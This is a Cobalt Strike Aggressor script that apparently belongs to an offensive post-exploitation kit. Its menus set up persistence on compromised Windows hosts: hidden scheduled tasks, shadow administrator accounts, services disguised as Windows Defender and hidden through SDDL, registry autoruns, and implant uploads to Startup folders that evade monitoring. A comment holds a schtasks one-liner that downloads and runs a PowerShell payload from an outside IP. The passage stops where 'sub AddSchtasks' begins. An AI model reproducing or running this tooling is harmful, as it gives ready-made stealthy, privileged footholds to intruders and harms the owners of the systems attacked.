menu "Persistence"{
    item "SharpSchTask" {
        blog($1, "\c9=========== SharpSchTask ==========");
        $bid = $1['@'];
        $dialog = dialog("SharpSchTask (.NET 2.0)", %(exec => "C:\\Windows\\Temp\\cmd.exe 1",bid => $bid), &SharpSchTask);
        dialog_description($dialog, "Using the Windows API, instrumentalize the creation of hidden scheduled tasks while bypassing security software blocks to achieve persistent control.");
        drow_text($dialog, "exec", "Parameters：");
        dbutton_action($dialog, "Run");
        dialog_show($dialog);
    }

    sub SharpSchTask{
        $arg = join(' ', @($3['exec']));
        bexecute_assembly!($bid, script_resource("/scripts/AuthMaintain/SchTask.exe"), $arg);
    }
    item "SharpShadowUser" {
        blog($1, "\c9=========== SharpShadowUser ==========");
        $bid = $1['@'];
        $dialog = dialog("SharpShadowUser (.NET 2.0)", %(exec => "Shadow Administrator",bid => $bid), &SharpShadowUser);
        dialog_description($dialog, "Bypass Remote memory loading clone shadow user");
        drow_text($dialog, "exec", "Parameters：");
        dbutton_action($dialog, "Run");
        dialog_show($dialog);
    }

    sub SharpShadowUser{
        $arg = join(' ', @($3['exec']));
        bexecute_assembly!($bid, script_resource("/scripts/AuthMaintain/ShadowUser.exe"), $arg);
    }
	
	menu "EasyPersistent" {
		item "Setting the common path" {
			local('$bid');
			foreach $bid ($1){
				prompt_text("File path?", $filePath, {
				$filePath = $1;
				if($filePath eq ""){
					show_message("FilePath Cleared.");
				}else{
					show_message("Set File Path:$filePath");
				}
				return $filePath;
				});
			}
		}
		menu "File Control"{  
			item "File Properties" {
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("File Properties Control attrib",%(filePath => $filePath, Action => "Attribute View",bid => $bid),lambda({
						#$1 is a dialog object, so you can't use $1 to receive Parameters here, use $3
						local('$filePath $Action');
						$filePath = $3['filePath'];
						$Action = $3['Action'];
						if($filePath eq ""){
							berror($bid,"Input FilePath.");
							return;
						}
						if($Action eq "Hide files"){
							blog($bid,, "-------".getnow()."-------");
							blog($bid,, "Hide files: \c4 attrib $filePath +s +h \o"); 
							bshell($bid,, "attrib \"$filePath\" +s +h");
						}else if($Action eq "Show files"){
							blog($bid, "-------".getnow()."-------");
							blog($bid, "Show files: \c4 attrib $filePath -s -h \o"); 
							bshell($bid, "attrib \"$filePath\" -s -h");
						}else if($Action eq "Attribute View"){
							blog($bid, "-------".getnow()."-------");
							blog($bid, "Attribute Check: \c4 attrib $filePath\o"); 
							bshell($bid, "attrib \"$filePath\"");
						}},$bid => $bid ));
					dialog_description($Dialog, "Use attrib to view and set File Properties.");
					drow_text($Dialog, "filePath", "FilePath: ");
					drow_combobox($Dialog, "Action", "Action: ", @("Attribute View","Hide files","Show files"));
					dbutton_action($Dialog, "Execution");
					dialog_show($Dialog);
			}}
			
			item "File Permissions" { 
				local('$bid');
				foreach $bid ($1){
					$user = replace(beacon_info($bid, "user"), " \\*", "");
					$Dialog = dialog("File PermissionsControl Icacls",%(filePath => $filePath, UserName => $user , Action => "",bid => $bid),lambda({
						#$1 is a dialog object, so you can't use $1 to receive Parameters here, use $3
						local('$filePath $Action $user');
						$filePath = $3['filePath'];
						$UserName = $3['UserName'];
						$Action = $3['Action'];
						if($Action eq "Grant Permissions"){
							blog($bid, "-------".getnow()."-------");
							blog($bid, "Grant Permissions: \c4 takeown /F \"$filePath\" & icacls \"$filePath\" /grant $UserName\:F \o");  #User:F - User Full access privileges   takeown.exe C:\Windows\System32\Magnify.exe
							bshell($bid, "takeown /F \"$filePath\"");
							bshell($bid, "icacls \"$filePath\" /grant $UserName\:F ");
						}else if($Action eq "Deny permission"){
							blog($bid, "-------".getnow()."-------");
							blog($bid, "Deny permission: \c4 takeown /F \"$filePath\" & icacls \"$filePath\" /deny $UserName\:F \o"); 
							bshell($bid, "takeown /F \"$filePath\"");
							bshell($bid, "icacls \"$filePath\" /deny $UserName\:F");
						}else if($Action eq "Permission Check"){
							blog($bid, "-------".getnow()."-------");
							blog($bid, "Permission Check: \c4 icacls \"$filePath\" \o"); 
							bshell($bid, "icacls \"$filePath\"");
						}},$bid => $bid ));
					dialog_description($Dialog, "Use Icacls for File Permissions viewing, Settings.");
					drow_text($Dialog, "filePath", "FilePath: ");
					drow_text($Dialog, "UserName", "UserName:");
					drow_combobox($Dialog, "Action", "Action: ", @("Permission Check","Grant Permissions","Deny permission"));
					dbutton_action($Dialog, "Execute");
					dialog_show($Dialog);
				}
			}
			
			item "File Links" {
				local('$bid');
				foreach $bid ($1){
					$user = replace(beacon_info($bid, "user"), " \\*", "");
					$Dialog = dialog("Create File Links",%(filePath => $filePath, LinkName => "" , Action => "",bid => $bid),lambda({
						#$1 is a dialog object, so you can't use $1 to receive Parameters here, use $3
						local('$filePath $Action $user');
						$filePath = $3['filePath'];
						$LinkName = $3['LinkName'];
						$Action = $3['Action'];
						if($Action eq "Hard Link"){
							blog($bid,, "-------".getnow()."-------");
							blog($bid,, "Hard Link: \c4 mklink /h \"$LinkName\" \"$filePath\" \o");
							bshell($bid,, "mklink /h \"$LinkName\" \"$filePath\"");
						}else if($Action eq "Soft Link"){
							blog($bid, "-------".getnow()."-------");
							blog($bid, "Soft Link: \c4 mklink \"$LinkName\" \"$filePath\"\o");
							bshell($bid,, "mklink \"$LinkName\" \"$filePath\"");
						}},$bid => $bid ));
					dialog_description($Dialog, "mklink C:\\StartUpPath\\run.exe C:\\tmp\\ . Note: The linked file name should be specified as an absolute path");
					drow_text($Dialog, "filePath", "FilePath:");
					drow_text($Dialog, "LinkName", "LinkName: ");
					drow_combobox($Dialog, "Action", "Action: ", @("Hard Link","Soft Link"));
					dbutton_action($Dialog, "Execute");
					dialog_show($Dialog);
				}
			}
		}

		menu "Register Startup item" {
			item "Add Registration Form startup item"{
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", Arch => binfo($bid, "arch") , KeyName => "Svchost", CallBackFile => "$filePath" ,bid => $bid),&AddRegAutoRun);
					dialog_description($Dialog, "Registration Form Add a startup item");
					drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
					drow_combobox($Dialog, "Arch", "Arch: ", @("x86", "x64"));
					drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx","Logon Scripts","Winlogon Shell", "Winlogon Userinit"));
					drow_text($Dialog, "KeyName", "KeyName: ");
					drow_text($Dialog, "CallBackFile", "CallBackFile: ");
					dbutton_action($Dialog, "RegAdd");
					dialog_show($Dialog);
				}
			}
			
			item "Remove Entry Form startup items"{
				local('$bid');  
				foreach $bid ($1){
					if (!-isadmin $1['@']){
						berror($bid,"Persistence Requires Admin Level Privileges");
					}
					else{
						$Dialog = dialog("Remove RegAutoRun",%(RegKey => "HKLM", Arch => binfo($bid, "arch") , RegItem => "Run" ,bid => $bid),&RemoveRegAutoRun);
						dialog_description($Dialog, "Remove Registration Form startup items");
						drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
						drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx", "Logon Scripts", "Winlogon Shell","Winlogon Userinit"));
						drow_text($Dialog, "KeyName", "KeyName: ");
						drow_combobox($Dialog, "Arch", "Arch: ", @("x86", "x64"));
						dbutton_action($Dialog, "RegDetele");
						dialog_show($Dialog);
					}
				}
			}
			
			item "Query startup items"{
				local('$bid $arch'); 
				foreach $bid ($1){
					$Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", Arch => "x64", bid => $bid),&QueryRegAutoRun);
					dialog_description($Dialog, "Query startup items");
					drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
					drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx","Logon Scripts","Winlogon Shell", "Winlogon Userinit"));
					drow_combobox($Dialog, "Arch", "Arch: ", @("All","x86", "x64"));
					dbutton_action($Dialog, "RegQuery");
					dialog_show($Dialog);
				}
			}
			
			item "All Registration Form startup items"{
				local('$bid $arch'); 
				foreach $bid ($1){
					blog($bid, "-------".getnow()."-------");
					#Winlogon Userinit
					bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /reg:32");
					bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /reg:64");
					bshell($bid,"reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /reg:32");
					bshell($bid,"reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Userinit /reg:64");
					#Winlogon Shell
					bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /reg:32");
					bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /reg:64");
					bshell($bid,"reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /reg:32");
					bshell($bid,"reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /reg:64");
					#Run
					bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /reg:32");
					bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /reg:64");
					bshell($bid,"reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /reg:32");
					bshell($bid,"reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /reg:64");
					#RunOnce
					bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /reg:32");
					bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /reg:64");
					bshell($bid,"reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /reg:32");
					bshell($bid,"reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /reg:64");
					#RunOnceEx
					bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\" /reg:32");
					bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\" /reg:64");
					bshell($bid,"reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\" /reg:32");
					bshell($bid,"reg query \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\" /reg:64");
					#Logon Scripts
					bshell($bid,"reg query \"HKCU\\Environment\" /v UserInitMprLogonScript /reg:32");
					bshell($bid,"reg query \"HKCU\\Environment\" /v UserInitMprLogonScript /reg:64");
				}
			}	
		}

		menu "System Services" {
			item "Add Service" {
				local('$bid');
				foreach $bid ($1){
					$filePath = "C:\\windows\\Temp\\".randomFileName(6).".exe";
					$Dialog = dialog("Servers Auto Run",%(servicename => "1_".randomFileName(6) , displayname => "1_".randomFileName(6) , binpath => "$filePath" ,description => "Windows Defender kernel support.",stype => "Self-start",bid => $bid,serviceFile => "C:\\windows\\Temp\\Service_".randomFileName(6).".exe",setsddl => "Display Service", evilFile => "" , cmdline => "CMD /c ".$filePath , addtype => "API"),&InstallAutoService);
					dialog_description($Dialog, "Add Service,If a non-service program requires the use of:cmd /c start xxx or rundll32 xxx.dll;The service program is used to accept the Control of SCM, providing two service programs, one for the normal start of the service for the Execution load; the other will only return failure, used as a start failure callback service.");
					drow_text($Dialog, "servicename", "Service Name: ");
					drow_text($Dialog, "serviceFile", "Service Procedure: ");
					drow_file($Dialog, "evilFile", "Select file: ");
					drow_text($Dialog, "binpath", "Remote Path: ");
					drow_text($Dialog, "cmdline", "Execution Command: ");
					drow_text($Dialog, "displayname", "Show Name: ");
					drow_text_big($Dialog, "description", "Service Description: ");
					drow_combobox($Dialog, "stype", "Startup Type: ", @("Self-start", "Delayed start", "Manual start", "Trigger start", "Start failure callback"));
					drow_combobox($Dialog, "setsddl", "Set SDDL: ", @("Show Services", "Read-only Services", "Hidden Services"));
					drow_combobox($Dialog, "addtype", "Add method: ", @("sc cmdline","API"));
					dbutton_action($Dialog, "ServiceAdd");
					dialog_show($Dialog);
				}
			}

			item "Modify Service" {
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("Servers Auto Run",%(servicename => "Wdfup", displayname => "Windows Defender Antivirus Update Service", binpath => "$filePath" ,description => "Windows Defender kernel support.",bid => $bid),&ChangeAutoService);
					dialog_description($Dialog, "sc config Modify Service");
					drow_text($Dialog, "servicename", "Service Name: ");
					drow_text($Dialog, "binpath", "File path: ");
					drow_text($Dialog, "displayname", "Show Name: ");
					drow_text_big($Dialog, "description", "Service Description: ");
					dbutton_action($Dialog, "ServiceEdit");
					dialog_show($Dialog);
				}
			}
			
			item "Settings SDDL" {
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("Edit Service SDDL",%(servicename => "Wdfup",SDDL => "Hide",bid => $bid),&HiddenService);
					dialog_description($Dialog, "Settings SDDL(Security Descriptor)");
					drow_text($Dialog, "servicename", "Service Name: ");
					drow_combobox($Dialog, "SDDL", "Operation: ", @("Hide", "Show"));
					dbutton_action($Dialog, "SDDL Edit");
					dialog_show($Dialog);
				}
			}
			
			#Remove Registration Form, sc Delete
			item "Delete Service" {
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("Delete Service",%(servicename => "Wdfup",bid => $bid),&DeleteService);
					dialog_description($Dialog, "Delete Service");
					drow_text($Dialog, "servicename", "Service Name: ");
					dbutton_action($Dialog, "DeleteService");
					dialog_show($Dialog);
				}
			}
			
			item "Query Service" {
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("Delete Service",%(servicename => "Wdfup",type => "all",state => "active",qtype => "query",bid => $bid),&QService);
					dialog_description($Dialog, "Query Service");
					drow_text($Dialog, "servicename", "Service Name: ");
					drow_combobox($Dialog, "type", "Service Type: ", @("driver", "service","userservice","all")); #Type of service to be enumerated(driver, service, userservice, all) 
					drow_combobox($Dialog, "state", "Service Status: ", @("active","inactive", "all")); 
					#Active, inactive, all
					drow_combobox($Dialog, "qtype", "Query method: ", @("query","qc"));
					dbutton_action($Dialog, "QueryService");
					dialog_show($Dialog);
				}
			}
		}
		menu "User Operation" {
			item "Check Account" {
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("Check Account",%(user => "test",localgroups => "Administrators",addtype => "NET", bid => $bid),lambda({
						if($3['user'] eq ""){
							if($3['addtype'] eq "NET" ){
								blog($3['bid'],"net1 user");
								bshell($3['bid'],"net1 user");	
							}
							if($3['addtype'] eq "BNET" ){
								bnet($3['bid'], "user");
							}
							if($3['addtype'] eq "API" ){
								local('$Parameter $bid');
								$bid = $3['bid'];
								$Parameter = "GetGroupUsers"."|1|1|".$3['localgroups']."|1";
								blog($bid,"$Parameter");
								bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "GetGroupUsers", 5000);	
							}
							if($3['addtype'] eq "REG" ){
								blog($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
								bshell($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names");
							}
						}else{
							if($3['addtype'] eq "NET" ){
								blog($3['bid'],"net1 user $3['user'] ");
								bshell($3['bid'],"net1 user $3['user'] ");	
							}
							if($3['addtype'] eq "BNET" ){
								bnet($3['bid'], "user", "\\\\127.0.0.1" ,$3['user']);
							}
							if($3['addtype'] eq "API" ){
								local('$Parameter $User $bid');
								$bid = $3['bid'];
								$User = $3['user'];

								$Parameter = "QueryUserInfo"."|".$User."|1|1|1";
								blog($bid,"$Parameter");
								bdllspawn!($bid, getFileProper(script_resource("/scripts/AuthMaintain"), "/Netapi32/reflective_dll.dll"),$Parameter, "QueryUserInfo", 5000);	
								
							}
							if($3['addtype'] eq "REG" ){
								blog($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\$3['user']");
								bshell($3['bid'], "reg query HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Account\\Users\\Names\\$3['user']");
							}
						}
					
						
					}));
					dialog_description($Dialog, "Check Account (Using the API, the account Parameters is empty according to the group query all Users; query the specified account, the group name Parameters will be ignored). Other User prompt: administrator, Guest; local group query: net localgroup");
					drow_text($Dialog, "user", "Account Name: ");
					drow_combobox($Dialog, "localgroups", "Select account group: ", @("Users","Guests","Administrators","Remote Desktop Users","Remote Management Users","System Managed Accounts Group",)); 
					drow_combobox($Dialog, "addtype", "Query method: ", @("NET","BNET","API","REG"));
					dbutton_action($Dialog, "Query");
					dbutton_help($Dialog, "https://www.qq.com");
					dialog_show($Dialog);
				}
			}
			
			item "Add User " {
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("Add New User To the group",%(user => "xasda",pass => "test@123",localgroups => "Administrators",comment => "",addtype => "API",bid => $bid),&AdUser);
					dialog_description($Dialog, "Add User ，Do not include \$ in the password, otherwise it will be easy to bug.");
					drow_text($Dialog, "user", "Account Name: ");
					drow_text($Dialog, "pass", "Account Password: ");
					drow_text($Dialog, "comment", "Account Description: ");
					drow_combobox($Dialog, "localgroups", "Joined groups: ", @("Administrators","Remote Desktop Users","Users","Guests"));  # net localgroup
					drow_combobox($Dialog, "addtype", "Add Mode: ", @("NET","API","SpoofArg"));
					dbutton_action($Dialog, "AdUser");
					dialog_show($Dialog);
				}
			}
			
			
			item "Delete User " {
				local('$bid');
				foreach $bid ($1){					
					$Dialog = dialog("User Delete",%(user => "test",type => "NET",bid => $bid),&DeleteUser);
					dialog_description($Dialog, "User Delete ");
					drow_text($Dialog, "user", "Account Name: ");
					drow_combobox($Dialog, "type", "ExecutionMode: ", @("NET","API"));
					dbutton_action($Dialog, "DeleteUser");
					dialog_show($Dialog);
				}
			}
			
			item "Modify account" {
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("Modify account",%(user => "Guest",pass => "test@123$",comment => "",localgroups => "Administrators",addtype => "NET",DoFt => "enable",bid => $bid),&ChangeAccount);
					dialog_description($Dialog, "1(enable). After activating the account Settings password and join the group (if the account does not exist will fail, the existing Account Description information will not be modified); 2(disabled). Remove User group, disable User; 3(remove group). Remove the account from a specific group. Note: Win10 Activate Guest cannot be used directly for login.");
					drow_text($Dialog, "user", "Account Name: ");
					drow_text($Dialog, "pass", "Account Password: ");
					drow_text($Dialog, "comment", "Account Description: ");
					drow_combobox($Dialog, "localgroups", "Operation group: ", @("Administrators","Remote Desktop Users","Users","Guests"));  # net localgroup
					drow_combobox($Dialog, "addtype", "ExecutionMode: ", @("NET","API"));
					drow_combobox($Dialog, "DoFt", "Execution Method: ", @("enable","disabled","removeGroup"));
					dbutton_action($Dialog, "Execution");
					dialog_show($Dialog);
				}
			}	
		}

		menu "Startup directory" {
			item "Query Startup directory" {
				local('$bid');
				foreach $bid ($1){
					$user = replace(beacon_info($bid, "user"), " \\*", "");
					if (-isadmin $bid) {
						if($user eq "SYSTEM"){
							blog($bid,"dir /A \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"");
							bshell($bid,"dir /A \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"");
						}else{
							blog($bid,"dir /A \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"");
							blog($bid,"dir /A \"C:\\Users\\$user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
							bshell($bid,"dir /A \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"");
							bshell($bid,"dir /A \"C:\\Users\\$user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
						}
					}else{
						blog($bid,"dir /A \"C:\\Users\\$user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
						bshell($bid,"dir /A \"C:\\Users\\$user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
					}
				}
			}
			
			item "Write to Startup directory" {
				local('$bid');
				foreach $bid ($1){
					$user = replace(beacon_info($bid, "user"), " \\*", "");
					if (-isadmin $bid) {
						$UploadPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\";
					}else{
						$UploadPath = "C:\\Users\\$user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
					}
					$Dialog = dialog("Startup directory Persistance Maintenance", %(UploadPath => $UploadPath , RemoteFileName => "360Safe.exe" , PersistentFile => $PersistentFile , bid => $bid ,Type => "Upload local file"), &StartUp);
					dialog_description($Dialog, "Upload permission maintenance program to Startup directory, apiWrite to evade Startup directory monitoring by moving the uploaded file Settings after restart (Write to after restart).");
					drow_text($Dialog, "UploadPath", "Startup directory: ");
					drow_text($Dialog, "RemoteFileName", "Remote File Name: ");
					drow_file($Dialog, "PersistentFile", "File to upload: ");
					drow_combobox($Dialog, "Type", "Type: ", @("Direct Upload", "APIReboot method"));
					dbutton_action($Dialog, "Execution");
					dialog_show($Dialog);
				}
			}
		}

		sub StartUp{
			local('$UploadPath $PersistentFile $bid $Type $Parameter $TempFile $RemoteFileName');
			$UploadPath = $3['UploadPath'];
			$bid = $3['bid'];
			$Type = $3['Type'];
			$RemoteFileName = $3['RemoteFileName'];
			$PersistentFile = $3['PersistentFile'];
			if($PersistentFile eq ""){
				show_error("Please select Upload file!");
			}
			if($RemoteFileName eq ""){
				show_error("Enter the remote file name!");
			}
			if($UploadPath eq ""){
				show_error("Please Settings Startup directory!");
			}
			if($Type eq "Direct Upload"){
				blog($bid,"Upload $PersistentFile To $UploadPath");
				bcd($bid, $UploadPath);
				bupload_raw($bid, $UploadPath.$RemoteFileName, readb(openf($PersistentFile), -1));
				sleep(3000);
				blog($bid,"Done.");
			}else if($Type eq "API Reboot Write to "){		
				$TempFile = "C:\\Windows\\Temp\\".randomFileName(6).".exe";
				blog($bid,"Upload $PersistentFile To $TempFile");
				bupload_raw($bid, $TempFile, readb(openf($PersistentFile), -1));
				blog($bid,"Sleep 3s");
				sleep(3000); #Pause for 3 seconds
				blog($bid,"Use API MoveFileEx $TempFile to ".$UploadPath.$RemoteFileName);
				$Parameter = $TempFile . "|" . $UploadPath.$RemoteFileName;	
				$Data = pack("I-", 3) .$Parameter; #?  How to use C++ constructors to pass multiple Parameters
				bdllspawn!($bid, getFileProper(script_resource("scripts/AuthMaintain"), "/StartUp/reflective_dll.dll"),$Data, "Move File", 5000);
			}
		}
		# https://www.coder.work/article/562756 Use single quotes in the Schedule Task Command line. shell SCHTASKS /Create /TN \Tempaa /TR "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\\\"http://192.168.200.191:8060/a22\\\"))\"" /RU Administrator /SC ONCE /ST 18:16 /RL HIGHEST /F
		
		menu "Program tasks"{
			item "Query Program tasks" {
				local('$bid');
				foreach $bid ($1){
					$Dialog = dialog("Add Program tasks",%(taskname => "MicrosoftEdgeUpdateTaskMachineCore" , bid => $bid) ,lambda({
						local('$pre');
						if($3['box'] eq "true" ){
							$pre =  "schtasks /query /fo LIST /v";
						}else{
							$pre =  "schtasks /query /fo LIST";
						}
						if( $3['taskname'] eq ""){
							blog($3['bid'], "Get All Schtasks List");
							bshell($3['bid'], $pre);
						}else{
							blog($3['bid'], "$pre");
							bshell($3['bid'], $pre . " /TN " .$3['taskname']);
						}
					}));
					dialog_description($Dialog, "QueryProgram tasks,Task name left blank for Query All (more data)");
					drow_text($Dialog, "taskname", "Task name(/TN): ");
					drow_checkbox($Dialog, "box", "Detailed Data: ", "Detailed information(/v)");
					dbutton_action($Dialog, "Schtasks Query");
					dialog_show($Dialog);
				}
			}

			item "AddCmdLine" {
				local('$bid $user $taskname $level $is_admin');
				foreach $bid ($1){
					#If it is a system account, the password is ignored and the User has to enter the password. The /RU option is to facilitate the creation of tasks from the administrator to SYSTEM and SYSTEM.
					$user = replace(beacon_info($bid, "user"), " \\*", "");
					@AdminUsers = @("Administrator","SYSTEM");
					
					if($user in @("Administrator","SYSTEM")){
						$is_admin = 1;
						$taskname = "\\Microsoft\\Windows\\Wininet\\UserCache_".ticks(); 
						$level = "HIGHEST";
						warn($user);  # Reminder, displayed in the Script Control Desk
					}else{
						#Non-administrators create Program tasks.
						#Normal User permissions are not available under the Write to Microsoft task.
						#Normal User cannot use /NP (no password is stored. Only local resources are available.) , /RL HIGHEST
						$is_admin = 0;
						$taskname = "\\Explorer\\Public\\temp_".ticks();
						$level = "LIMITED";
						warn($user);
					}
					$Dialog = dialog("Add Program tasks",%(taskname => $taskname,taskinfo => "Coordinates transactions across multiple databases, message queues, file systems, and other resource managers. If this task is stopped, these transactions will fail. If this task is disabled, other services that explicitly depend on it will not start and the system may fail abnormally, so please disable it carefully.",taskrun => "C:\\beacon.exe",runuser => $user,level => $level,dotype => "ONSTART",ChannelName => "",EventID => "",bid => $bid),&AddSchtasks);
					dialog_description($Dialog, "Add Program tasks");
					drow_text($Dialog, "taskname", "Task name(/TN): ");
					drow_text($Dialog, "taskinfo", "Task Description: ");
					drow_text($Dialog, "taskrun", "File path(/TR): ");
					if($is_admin){
						drow_combobox($Dialog, "runuser", "User Account(/RU): ", @("Administrator","SYSTEM"));   # If the User is Administrator, then you can raise the privilege by selecting SYSTEM option
						#High privileges can be selected by choosing ONSTART ONLOGON, etc.
						drow_combobox($Dialog, "dotype", "Program Frequency(/SC): ", @("ONSTART","ONLOGON","ONIDLE","ONEVENT","ONCE","MINUTE","HOURLY","DAILY","WEEKLY","MONTHLY"));
					}else{ 
						drow_text($Dialog, "runuser", "User Account(/RU): ");
						drow_combobox($Dialog, "dotype", "Program Frequency(/SC): ", @("ONSTART","ONLOGON","ONIDLE","ONEVENT","ONCE","MINUTE","HOURLY","DAILY","WEEKLY","MONTHLY"));
					}
					drow_combobox($Dialog, "level", "Run Level(/RL): ", @("LIMITED","HIGHEST"));
					dbutton_action($Dialog, "AddSchtasks");
					dialog_show($Dialog);
				}
			}
			
			item "Add-TaskAPI" {
				local('$bid $user $taskname $level $is_admin');
				foreach $bid ($1){
					#If it is a system account, the password is ignored and the User has to enter the password. The /RU option is to facilitate the creation of tasks from the administrator to SYSTEM and SYSTEM.
					$user = replace(beacon_info($bid, "user"), " \\*", "");
					@AdminUsers = @("Administrator","SYSTEM");
					
					if($user in @("Administrator","SYSTEM","LOCAL SERVICE")){
						$is_admin = 1;
						$taskname = "\\Microsoft\\Windows\\Wininet\\UserCache_".ticks();  # LOCAL SERVICE can Write to directory
						warn($user);  # Note that this is displayed in the Script Control Desk for debugging output.
					}else{
						#Non-administrator created Program tasks。
						#Normal User permissions are not available under the Write to Microsoft task.
						#Normal User cannot use /NP (no password is stored. Only local resources are available.), /RL HIGHEST
						$is_admin = 0;
						$taskname = "\\Explorer\\Public\\temp_".ticks();
						warn($user);
					}
					$Dialog = dialog("Add Program tasks",%(taskname => $taskname,taskinfo => "Coordinates transactions across multiple databases, message queues, file systems, and other resource managers. If this task is stopped, these transactions will fail. If this task is disabled, other services that explicitly depend on it will not start and the system may fail abnormally, so please disable it carefully.",taskrun => "C:\\beacon.exe",runuser => $user,dotype => "BOOT",CreateIs => "Microsoft Corporation",Runtime => "",bid => $bid),&AddSchtasks_API);
					dialog_description($Dialog, "Using APIAdd Program tasks in the reflection DLL");
					drow_text($Dialog, "taskname", "Task name: ");
					drow_text($Dialog, "taskinfo", "Task Description: ");
					drow_text($Dialog, "CreateIs", "Created by: ");
					drow_text($Dialog, "taskrun", "ExecutionCommand: ");
					if($is_admin){
						if($user eq "SYSTEM"){
							drow_combobox($Dialog, "runuser", "Initiating User: ", @($user,"\\Everyone","Local Service")); 
						}else if($user eq "LOCAL SERVICE")
						{
							drow_text($Dialog, "runuser", "Initiating User: "); 
						}
						else{
							drow_combobox($Dialog, "runuser", "Initiating User: ", @($user,"NT AUTHORITY\\SYSTEM","Local Service"));   # If the User is Administrator, then you can remove the power by selecting the SYSTEM option
						}
						
						drow_combobox($Dialog, "dotype", "Trigger Mode: ", @("ONBOOT","ONLOGON","ONIDLE","ONEVENT","ONCE","DAILY","WEEKLY","MONTHLY","SESSION_STATE_CHANGE"));
					}else{ 
						drow_text($Dialog, "runuser", "Initiating User: ");
						drow_combobox($Dialog, "dotype", "Trigger Mode: ", @("ONIDLE","ONCE","DAILY","WEEKLY","MONTHLY"));
					}
					
					dbutton_action($Dialog, "AddSchtasks");
					#dbutton_help($Dialog, "http://www.google.com");
					dialog_show($Dialog);
				}
			}
			
			item "Delete Program tasks" {
				local('$bid $user $taskname');
				foreach $bid ($1){
					$user = replace(beacon_info($bid, "user"), " \\*", "");
					@AdminUsers = @("Administrator","SYSTEM");
					if($user in @("Administrator","SYSTEM")){
							$taskname = "\\Microsoft\\Windows\\Wininet\\UserCache_"; 
							warn($user);
					}else{
							$taskname = "\\Explorer\\Public\\temp_";
							warn($user);
					}
					$Dialog = dialog("Delete Program tasks",%(taskname => $taskname , type => "schtasks" , bid => $bid) , &DelSchtasks);
					dialog_description($Dialog, "Delete Program tasks");
					drow_text($Dialog, "taskname", "Task name(/TN): ");
					drow_combobox($Dialog, "type", "ExecutionMode: ", @("schtasks","API"));
					dbutton_action($Dialog, "DelSchtasks");
					dialog_show($Dialog);
				}
			}
		}

		sub AddSchtasks{
